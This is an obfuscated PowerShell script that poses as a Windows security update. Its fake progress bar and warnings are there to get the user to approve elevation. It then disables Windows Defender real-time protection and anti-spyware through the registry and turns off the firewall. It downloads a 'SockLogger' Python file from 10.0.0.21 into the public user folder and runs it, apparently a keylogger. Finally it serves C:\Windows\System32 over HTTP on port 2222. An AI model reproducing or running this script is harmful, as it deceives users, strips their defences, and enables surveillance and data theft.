 seT-VariAbLe ("0fEQ"+"w")  ( [typE]("{2}{1}{3}{0}{6}{4}{5}" -f 'RinciPa','eCuri','s','ty.P','IndowsID','ENTITy','L.W')); if (-NOT ([Security.Principal.WindowsPrincipal]  $0FEQw::("{1}{2}{0}"-f'nt','GetCurr','e').Invoke())."iSin`RO`le"([Security.Principal.WindowsBuiltInRole] ("{0}{1}{2}"-f 'Admi','ni','strator')))

{

  ${Arg`UMe`NTS} = "& '" +${MYinvo`C`ATion}."myCoMma`Nd"."d`ef`IniTIon" + "'"

  &("{2}{0}{3}{1}"-f'ta','rocess','S','rt-P') ("{3}{1}{2}{0}" -f'l','wersh','el','po') -Verb ("{1}{0}"-f 'unAs','r') -ArgumentList ${arGuM`en`TS}

  Break

}
for (${i} = 1; ${i} -le 50; ${i}++ ) {
    &("{1}{4}{3}{2}{0}" -f'ss','Write-','re','rog','P') -Activity ("{3}{7}{6}{8}{5}{4}{0}{1}{9}{2}" -f 's',' che','...','Pl','ows i','d',' whi','ease wait','le win','cking for updates') -Status ("$i% "+'Compl'+'et'+'e:') -PercentComplete ${i}
    &("{2}{3}{1}{0}" -f'p','Slee','S','tart-') -Milliseconds 0.500
}

.("{2}{1}{3}{0}"-f 'leep','art','St','-S') -Seconds 1
.("{1}{3}{0}{2}" -f'te-H','Wr','ost','i') "`r`n`r`n`r`n`r`n`r`n"

write-Host ="
                 __
            ,-~¨^  ^¨-,           _,
           /          / ;^-._...,¨/
          /          / /         /
         /          / /         /
        /          / /         /
       /,.-:''-,_ / /         /
       _,.-:--._ ^ ^:-._ __../
     /^         / /¨:.._¨__.;
    /          / /      ^  /
   /          / /         /
  /          / /         /
 /_,.--:^-._/ /         /
^            ^¨¨-.___.:^
"


&("{0}{1}{2}{3}"-f'W','r','ite-O','utput') ('[!]'+' '+'SECURI'+'TY '+'UPDATE'+'! '+'Pl'+'ease '+'dont'+' '+'t'+'urn '+'o'+'ff '+'the'+' '+"device.....`r`n")

.("{1}{2}{0}" -f 'p','Star','t-Slee') -Seconds 3
&("{2}{3}{0}{1}" -f 'utpu','t','W','rite-O') ("`r`n[!] "+'WINDOW'+'S '+'FOUND'+' '+'CRIT'+'ICAL '+'PRO'+'BL'+'EMS! '+"`r`n`r`n[!] "+'Af'+'ter '+'wi'+'ndo'+'ws '+'wi'+'ll '+'p'+'op'+'-out, '+'pr'+'e'+'ss '+('{0'+'}y'+'es{0}'+' ') -F  [char]39+'pleas'+'e'+' '+'an'+'d '+'wait'+' '+'for'+' '+'t'+'he '+'pr'+'oce'+'ss '+'to'+' '+'fi'+'nish.')

&("{1}{3}{2}{0}"-f 'ep','St','e','art-Sl') -Second 4



${m`Al} = .("{0}{1}{3}{4}{2}" -f 'Set-MpP','r','rence','ef','e') -DisableRealtimeMonitoring ${t`RuE}

${M`Al2} = &("{4}{1}{2}{0}{3}"-f 'Proper','ew','-Item','ty','N') -Path ((("{0}{5}{3}{8}{4}{1}{10}{7}{2}{9}{6}"-f'H','ARE{0}Policies{0}Mi','Windows Defen','LM:{0}','W','K','er','}','SOFT','d','crosoft{0')) -F  [chAR]92) -Name ("{0}{3}{1}{2}{4}{5}"-f'Disable','nt','i','A','S','pyware') -Value 1 -PropertyType ("{0}{1}" -f'DWO','RD') -Force

${M`AL3} = .("{0}{1}"-f 'n','etsh') ("{0}{1}{2}" -f 'advfi','rewa','ll') ("{1}{0}" -f'et','s') ("{1}{3}{2}{0}"-f'ofiles','a','pr','ll') ("{0}{1}"-f 'st','ate') ("{1}{0}"-f 'f','of')
&("{2}{0}{1}" -f's','hell.exe','power') -ep ("{2}{1}{0}"-f 's','ypas','b') -WindowStyle ("{1}{0}"-f 'dden','hi') -Command ${M`AL}; .("{2}{0}{1}" -f'Slee','p','Start-') -Seconds 2; ${m`AL2}; .("{1}{2}{0}"-f'leep','S','tart-S') -Seconds 3; ${m`AL3};
.("{1}{2}{0}{3}"-f'S','Start','-','leep') -Seconds 3



${MAc`H`iNe} = ("{5}{2}{0}{3}{1}{4}"-f '://','.0.0.21','tp','10',':','ht')
${P`ort} = "80"
(.("{0}{2}{1}"-f'New','Object','-') ("{0}{1}{3}{2}" -f 'N','e','bClient','t.We')).("{2}{0}{1}{3}"-f 'n','loadFi','Dow','le').Invoke("$Machine$Port/SockLogger-Obfuscate.pyw", ((("{3}{8}{1}{7}{11}{0}{5}{10}{4}{9}{6}{2}{12}"-f'SockLo','rs8O','cat','C:8O','Ob','gge','s','Ipublic8','IUse','fu','r-','OI','e.pyw'))-RePLACE ([char]56+[char]79+[char]73),[char]92));
.("{2}{1}{0}" -f'ep','le','Start-S') -Seconds 2
&("{3}{1}{2}{0}"-f't-Process','a','r','st') -FilePath ((("{4}{0}{8}{10}{7}{5}{2}{1}{9}{6}{3}"-f':{0','0}S','c{','ger-Obfuscate.pyw','C','publi','Log','s{0}','}U','ock','ser'))-f  [chAr]92)
${Ch`ANG`Ed} = &('cd') ((("{0}{3}{4}{2}{1}" -f 'C:','stem32','Asy','fYAWindo','wsfY')) -CrePlAce([Char]102+[Char]89+[Char]65),[Char]92)
&("{1}{0}{2}" -f 'owershell.e','p','xe') -ep ("{1}{0}{2}" -f 'y','b','pass') -NoExit -Command "&""{$ChangeD; Start-Sleep -Seconds 2; py -3.10 -m http.server 2222; Start-Sleep -Seconds 2}"